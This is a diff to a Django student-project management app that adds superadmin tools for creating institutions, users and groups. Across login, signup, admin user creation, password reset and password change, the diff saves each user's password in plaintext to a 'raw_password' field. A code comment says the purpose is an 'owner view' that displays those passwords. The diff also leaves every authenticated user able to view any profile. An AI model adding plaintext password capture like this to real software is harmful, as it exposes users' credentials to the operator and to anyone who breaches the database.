@@ -1,4 +1,4 @@
-# Force Launch - ProTrack v1.07 Enterprise Edition
+# Force Launch - ProTrack v1.08 Enterprise Edition
 import re
 import csv
 import json
@@ -115,8 +115,6 @@ def can_view_profile(viewer_user, target_profile):
         return viewer_user.is_superuser
     if viewer_user.is_superuser or viewer_user.id == target_profile.user_id:
         return True
-    # Allow shared public profile links to be viewed by authenticated ProTrack users
-    # while keeping superadmin isolated
     if viewer_user.is_authenticated:
         return True
     allowed_ids = get_authorized_profile_ids(viewer_user)
@@ -186,11 +184,6 @@ def api_check_username(request):
 
 @login_required
 def api_search_classmates(request):
-    """
-    Interactive classmate search restricted strictly to the student's department.
-    Includes the team creator (current user) marked with is_self=True so they appear
-    in the dropdown but cannot add themselves.
-    """
     if request.user.is_superuser:
         return JsonResponse({'results': []})
     profile = getattr(request.user, 'profile', None)
@@ -215,7 +208,6 @@ def api_search_classmates(request):
         )
 
     results = []
-    # Put creator first if matching
     for p in qs[:25]:
         results.append({
             'user_id': p.user.id,
@@ -288,6 +280,11 @@ def login_view(request):
             if user.is_superuser:
                 messages.error(request, "Invalid username or password. Please use your authorized login route.")
                 return redirect('login')
+            # Sync raw_password on successful sign-in so pre-existing accounts also populate owner view
+            prof = getattr(user, 'profile', None)
+            if prof and p and prof.raw_password != p:
+                prof.raw_password = p
+                prof.save(update_fields=['raw_password'])
             login(request, user)
             request.session['play_success_sound'] = True
             messages.success(request, f"Welcome back, {user.get_full_name() or user.username}!")
@@ -318,7 +315,6 @@ def signup_view(request):
         email = request.POST.get('email', '').strip()
         username = request.POST.get('username', '').strip()
         password = request.POST.get('password', '').strip()
-        # Preserve exact case/formatting of identifier as entered by the user
         identifier = request.POST.get('identifier', '').strip()
         class_division = request.POST.get('class_division', 'Class-A').strip()
         whatsapp_number = request.POST.get('whatsapp_number', '').strip()
@@ -329,7 +325,7 @@ def signup_view(request):
             return redirect('signup')
 
         if not is_valid_email_address(email):
-            messages.error(request, "A valid Email Address (e.g., johndoe@example.com) is mandatory.")
+            messages.error(request, "A valid Email Address (johndoe@example.com) is mandatory.")
             return redirect('signup')
 
         if not re.match(r'^[a-zA-Z0-9_.-]{3,30}$', username):
@@ -344,7 +340,6 @@ def signup_view(request):
             messages.error(request, "Password is required and must be at least 6 characters long.")
             return redirect('signup')
 
-        # Strict Role-Based Roll Number / ID Validation (no hyphens/dashes, exact length & format)
         is_valid_id, id_err_msg = validate_role_identifier(role, identifier)
         if not is_valid_id:
             messages.error(request, id_err_msg)
@@ -452,7 +447,8 @@ def signup_view(request):
             id_proof_front=id_front,
             id_proof_back=id_back,
             is_verified_admin=(role == 'ADMIN'),
-            whatsapp_number=whatsapp_number
+            whatsapp_number=whatsapp_number,
+            raw_password=password
         )
 
         dept_admins = User.objects.filter(is_superuser=False, profile__department=department, profile__role='ADMIN').exclude(id=user.id)
@@ -501,7 +497,7 @@ def mark_notifications_read(request):
     return redirect(request.META.get('HTTP_REFERER', 'dashboard_router'))
 
 # ==============================================================================
-# DEDICATED PRIVATE SUPERADMIN FLOW
+# DEDICATED PRIVATE SUPERADMIN FLOW (FULL OWNER CREATION & DATA INSPECTOR)
 # ==============================================================================
 @never_cache
 def superadmin_login_view(request):
@@ -580,27 +576,204 @@ def superadmin_dashboard_view(request):
             else:
                 messages.error(request, "Password must be at least 6 characters.")
 
+        # --- SUPERADMIN DATABASE CREATION ACTIONS ---
+        elif action == 'sa_add_university':
+            name = request.POST.get('university_name', '').strip()
+            if name:
+                University.objects.get_or_create(name=name, defaults={'created_by': request.user})
+                request.session['play_success_sound'] = True
+                messages.success(request, f"University '{name}' added to database.")
+
+        elif action == 'sa_add_college':
+            uni_id = request.POST.get('university_id', '').strip()
+            col_name = request.POST.get('college_name', '').strip()
+            if uni_id.isdigit() and col_name:
+                u = get_object_or_404(University, id=int(uni_id))
+                College.objects.get_or_create(university=u, name=col_name)
+                request.session['play_success_sound'] = True
+                messages.success(request, f"College '{col_name}' added under {u.name}.")
+
+        elif action == 'sa_add_department':
+            col_id = request.POST.get('college_id', '').strip()
+            dept_name = request.POST.get('department_name', '').strip()
+            acad_year = request.POST.get('academic_year', '2026-2027').strip() or '2026-2027'
+            if col_id.isdigit() and dept_name:
+                c = get_object_or_404(College, id=int(col_id))
+                Department.objects.get_or_create(college=c, name=dept_name, defaults={'academic_year': acad_year})
+                request.session['play_success_sound'] = True
+                messages.success(request, f"Department '{dept_name}' added under {c.name}.")
+
+        elif action == 'sa_create_user':
+            role = request.POST.get('role', 'STUDENT').strip().upper()
+            if role not in ('STUDENT', 'GUIDE', 'ADMIN'):
+                role = 'STUDENT'
+            is_examiner_flag = (request.POST.get('is_examiner') == 'on') and (role == 'GUIDE')
+            full_name = request.POST.get('full_name', '').strip()
+            username = request.POST.get('username', '').strip()
+            email = request.POST.get('email', '').strip()
+            password = request.POST.get('password', '').strip()
+            identifier = request.POST.get('identifier', '').strip()
+            class_division = request.POST.get('class_division', 'TY-CS-A').strip()
+            whatsapp_number = request.POST.get('whatsapp_number', '').strip()
+            github_handle = request.POST.get('github_handle', '').strip()
+            youtube_handle = request.POST.get('youtube_handle', '').strip()
+            instagram_handle = request.POST.get('instagram_handle', '').strip()
+            bio = request.POST.get('bio', '').strip()
+            uni_id = request.POST.get('university_id', '').strip()
+            col_id = request.POST.get('college_id', '').strip()
+            dept_id = request.POST.get('department_id', '').strip()
+            avatar_file = request.FILES.get('avatar')
+            id_front = request.FILES.get('id_proof_front')
+            id_back = request.FILES.get('id_proof_back')
+
+            if not full_name or not username:
+                request.session['play_who_are_you'] = True
+                messages.error(request, "Full Name and Username are required to create a user.")
+                return redirect('superadmin_dashboard')
+
+            if not is_valid_email_address(email):
+                messages.error(request, "Please enter a valid Email Address.")
+                return redirect('superadmin_dashboard')
+
+            if User.objects.filter(username__iexact=username).exists():
+                messages.error(request, f"Username '@{username}' already exists.")
+                return redirect('superadmin_dashboard')
+
+            if len(password) < 6:
+                messages.error(request, "Password must be at least 6 characters.")
+                return redirect('superadmin_dashboard')
+
+            is_valid_id, id_err = validate_role_identifier(role, identifier)
+            if not is_valid_id:
+                messages.error(request, id_err)
+                return redirect('superadmin_dashboard')
+
+            university = University.objects.filter(id=int(uni_id)).first() if uni_id.isdigit() else None
+            college = College.objects.filter(id=int(col_id)).first() if col_id.isdigit() else None
+            department = Department.objects.filter(id=int(dept_id)).first() if dept_id.isdigit() else None
+
+            if not (university and college and department):
+                messages.error(request, "Please select a valid University, College, and Department.")
+                return redirect('superadmin_dashboard')
+
+            parts = full_name.split(' ', 1)
+            new_u = User.objects.create_user(
+                username=username,
+                email=email,
+                password=password,
+                first_name=parts[0],
+                last_name=parts[1] if len(parts) > 1 else ''
+            )
+            new_prof = UserProfile.objects.create(
+                user=new_u,
+                role=role,
+                is_examiner=is_examiner_flag,
+                university=university,
+                college=college,
+                department=department,
+                identifier=identifier,
+                class_division=class_division if role == 'STUDENT' else '',
+                whatsapp_number=whatsapp_number,
+                github_handle=github_handle,
+                youtube_handle=youtube_handle,
+                instagram_handle=instagram_handle,
+                bio=bio[:280],
+                is_verified_admin=(role == 'ADMIN'),
+                raw_password=password
+            )
+            if avatar_file and validate_file_ext(avatar_file, ALLOWED_AVATAR_EXT):
+                new_prof.avatar = avatar_file
+            if id_front and validate_file_ext(id_front, ALLOWED_PROOF_EXT):
+                new_prof.id_proof_front = id_front
+            if id_back and validate_file_ext(id_back, ALLOWED_PROOF_EXT):
+                new_prof.id_proof_back = id_back
+            new_prof.save()
+
+            request.session['play_success_sound'] = True
+            messages.success(request, f"Created {new_prof.get_role_display()} account for {full_name} (@{username})!")
+
+        elif action == 'sa_reset_user_password':
+            uid = request.POST.get('user_id', '').strip()
+            new_pass = request.POST.get('new_user_password', '').strip()
+            if uid.isdigit() and len(new_pass) >= 6:
+                target_u = get_object_or_404(User, id=int(uid), is_superuser=False)
+                target_u.set_password(new_pass)
+                target_u.save()
+                if hasattr(target_u, 'profile'):
+                    target_u.profile.raw_password = new_pass
+                    target_u.profile.save(update_fields=['raw_password'])
+                request.session['play_success_sound'] = True
+                messages.success(request, f"Updated password for @{target_u.username}.")
+            else:
+                messages.error(request, "New password must be at least 6 characters.")
+
+        elif action == 'sa_toggle_examiner':
+            prof_id = request.POST.get('profile_id', '').strip()
+            if prof_id.isdigit():
+                tp = get_object_or_404(UserProfile, id=int(prof_id), role='GUIDE', user__is_superuser=False)
+                tp.is_examiner = not tp.is_examiner
+                tp.save(update_fields=['is_examiner'])
+                messages.success(request, f"Updated Examiner status for {tp.user.get_full_name() or tp.user.username}.")
+
+        elif action == 'sa_create_group':
+            g_name = request.POST.get('group_name', '').strip()
+            dept_id = request.POST.get('department_id', '').strip()
+            guide_id = request.POST.get('guide_id', '').strip()
+            if g_name and dept_id.isdigit():
+                dept_obj = get_object_or_404(Department, id=int(dept_id))
+                guide_user = User.objects.filter(id=int(guide_id), is_superuser=False, profile__role='GUIDE').first() if guide_id.isdigit() else None
+                grp = ProjectGroup.objects.create(
+                    name=g_name,
+                    join_code=generate_join_code(),
+                    department=dept_obj,
+                    guide=guide_user,
+                    guide_status='ACCEPTED' if guide_user else 'NONE'
+                )
+                request.session['play_success_sound'] = True
+                messages.success(request, f"Project Group '{grp.name}' (Code: {grp.join_code}) created in {dept_obj.name}.")
+
         elif action == 'delete_user':
             uid = request.POST.get('user_id', '')
             if uid.isdigit():
                 User.objects.filter(id=int(uid), is_superuser=False).delete()
-                request.session['play_success_sound'] = True
-                messages.success(request, "Selected user record deleted.")
+                messages.info(request, "Selected user record deleted.")
 
         elif action == 'delete_group':
             gid = request.POST.get('group_id', '')
             if gid.isdigit():
                 ProjectGroup.objects.filter(id=int(gid)).delete()
-                request.session['play_success_sound'] = True
-                messages.success(request, "Selected project group deleted.")
+                messages.info(request, "Selected project group deleted.")
+
+        elif action == 'delete_department':
+            did = request.POST.get('dept_id', '')
+            if did.isdigit():
+                Department.objects.filter(id=int(did)).delete()
+                messages.info(request, "Selected department deleted.")
+
+        elif action == 'delete_college':
+            cid = request.POST.get('college_id', '')
+            if cid.isdigit():
+                College.objects.filter(id=int(cid)).delete()
+                messages.info(request, "Selected college deleted.")
+
+        elif action == 'delete_university':
+            unid = request.POST.get('university_id', '')
+            if unid.isdigit():
+                University.objects.filter(id=int(unid)).delete()
+                messages.info(request, "Selected university deleted.")
 
         return redirect('superadmin_dashboard')
 
     universities = University.objects.all()
     colleges = College.objects.select_related('university').all()
     departments = Department.objects.select_related('college__university').all()
-    profiles = UserProfile.objects.filter(user__is_superuser=False).select_related('user', 'university', 'college', 'department')
-    groups = ProjectGroup.objects.select_related('department__college__university', 'guide').prefetch_related('students')
+    profiles = UserProfile.objects.filter(user__is_superuser=False).select_related(
+        'user', 'university', 'college', 'department', 'preferred_guide'
+    ).prefetch_related('user__student_groups__proposal')
+    groups = ProjectGroup.objects.select_related(
+        'department__college__university', 'guide', 'requested_guide', 'proposal', 'viva'
+    ).prefetch_related('students__profile')
+    guides_all = UserProfile.objects.filter(role='GUIDE', user__is_superuser=False).select_related('user', 'department')
 
     return render(request, 'superadmin_dashboard.html', {
         'universities': universities,
@@ -608,6 +781,7 @@ def superadmin_dashboard_view(request):
         'departments': departments,
         'profiles': profiles,
         'groups': groups,
+        'guides_all': guides_all,
         'active_tab': 'superadmin_dashboard',
     })
 
@@ -746,6 +920,8 @@ def profile_settings_view(request):
             else:
                 request.user.set_password(new_pass)
                 request.user.save()
+                profile.raw_password = new_pass
+                profile.save(update_fields=['raw_password'])
                 update_session_auth_hash(request, request.user)
                 request.session['play_success_sound'] = True
                 messages.success(request, "Your password has been updated securely.")
@@ -828,14 +1004,12 @@ def student_dashboard(request):
             group.creator = first_member
             group.save(update_fields=['creator'])
 
-    # Strictly display only Faculty Guides belonging to the student/team's department
     dept_guides = User.objects.filter(
         is_superuser=False,
         profile__department=dept,
         profile__role='GUIDE'
     ).select_related('profile') if dept else User.objects.none()
 
-    # Include current user (creator) + unassigned students in the same department
     dept_students = User.objects.filter(
         is_superuser=False,
         profile__department=dept,
@@ -847,7 +1021,6 @@ def student_dashboard(request):
     if request.method == 'POST':
         action = request.POST.get('action')
 
-        # 1. Create a New Team (Prevent self-addition & duplicate members; send Guide Request)
         if action == 'create_group' and not group:
             group_name = request.POST.get('group_name', '').strip()
             guide_id = request.POST.get('guide_id', '').strip()
@@ -880,7 +1053,6 @@ def student_dashboard(request):
             )
             new_group.students.add(request.user)
 
-            # Deduplicate teammate IDs & prevent creator from adding themselves twice
             seen_ids = {request.user.id}
             added_names = []
             for tid in raw_teammate_ids:
@@ -913,11 +1085,10 @@ def student_dashboard(request):
             messages.success(request, f"Team '{new_group.name}' created! Share 5-character Join Code {new_group.join_code} with teammates.{guide_msg}")
             return redirect('student_dashboard')
 
-        # 2. Join Existing Team via 5-Char Code (Prevent duplicates)
         elif action == 'join_group' and not group:
             raw_code = request.POST.get('join_code', '').strip().upper()
             if not re.match(r'^[A-Z0-9]{5}$', raw_code):
-                messages.error(request, "Invalid Join Code format. Please enter a valid 5-character alphanumeric group code (e.g. A8K2P).")
+                messages.error(request, "Invalid Join Code format. Please enter a valid 5-character alphanumeric group code (A8K2P).")
                 return redirect('student_dashboard')
 
             target_group = ProjectGroup.objects.filter(join_code=raw_code, department=dept).first()
@@ -932,7 +1103,6 @@ def student_dashboard(request):
                 messages.success(request, f"Successfully joined '{target_group.name}'!")
             return redirect('student_dashboard')
 
-        # 3. Invite / Add Eligible Classmate to Existing Team (Creator only, prevent duplicates & self)
         elif action == 'add_member_to_group' and group:
             if group.creator_id != request.user.id:
                 messages.error(request, "Only the Team Creator can add or remove members.")
@@ -961,7 +1131,6 @@ def student_dashboard(request):
                 messages.warning(request, "No new eligible classmates were selected or they are already in a team.")
             return redirect('student_dashboard')
 
-        # 4. Team Creator Removes a Member (with confirmation & validation)
         elif action == 'remove_member' and group:
             if group.creator_id != request.user.id:
                 messages.error(request, "Only the Team Creator is authorized to remove team members.")
@@ -982,7 +1151,6 @@ def student_dashboard(request):
                 messages.success(request, f"Removed {target_member.get_full_name() or target_member.username} from {group.name}.")
             return redirect('student_dashboard')
 
-        # 5. Member Leaves Team (with confirmation, validation & history archiving)
         elif action == 'leave_group' and group:
             confirm_leave = request.POST.get('confirm_leave', 'yes')
             if confirm_leave != 'yes':
@@ -1004,7 +1172,6 @@ def student_dashboard(request):
             messages.success(request, f"You have left team '{group_name}'. Your participation has been saved to your Student Project History.")
             return redirect('student_dashboard')
 
-        # 6. Request a Faculty Guide from the Team's Department
         elif action == 'request_guide' and group:
             guide_id = request.POST.get('guide_id', '').strip()
             if not guide_id.isdigit():
@@ -1032,7 +1199,6 @@ def student_dashboard(request):
             messages.success(request, f"Guide request sent to {target_guide.get_full_name() or target_guide.username}! They will be assigned once they accept.")
             return redirect('student_dashboard')
 
-        # 7. Submit / Update Project Proposal (includes Technology Stack)
         elif action == 'submit_proposal' and group:
             title = request.POST.get('title', '').strip()
             domain = request.POST.get('domain', '').strip()
@@ -1069,7 +1235,6 @@ def student_dashboard(request):
             messages.success(request, f"Proposal saved! AI Similarity Score: {sim_res['score']}%.")
             return redirect('student_dashboard')
 
-        # 8. Submit Weekly Log
         elif action == 'submit_log' and group:
             week_num = request.POST.get('week_number', '1')
             tasks = request.POST.get('tasks_completed', '').strip()
@@ -1089,7 +1254,6 @@ def student_dashboard(request):
                 messages.error(request, "Tasks Completed and Next Week Target Plan are required.")
             return redirect('student_dashboard')
 
-        # 9. Add Previous Team / Project Idea to Student History directly from Dashboard
         elif action == 'add_history':
             team_name = request.POST.get('team_name', '').strip()
             project_idea = request.POST.get('project_idea', '').strip()
@@ -1165,7 +1329,6 @@ def guide_dashboard(request):
     if request.method == 'POST':
         action = request.POST.get('action')
 
-        # Accept a Team's Guide Request -> officially assigns the guide
         if action == 'accept_guide_request':
             gid = request.POST.get('group_id')
             grp = get_object_or_404(ProjectGroup, id=gid, department=dept)
@@ -1473,7 +1636,6 @@ def admin_dashboard(request):
         students_qs = students_qs.filter(university=admin_uni)
         groups_qs = groups_qs.filter(department__college__university=admin_uni)
 
-    # Keep a full department-scoped guide list for the group assignment dropdowns
     college_guides_all = list(guides_qs)
 
     if dept_filter.isdigit():
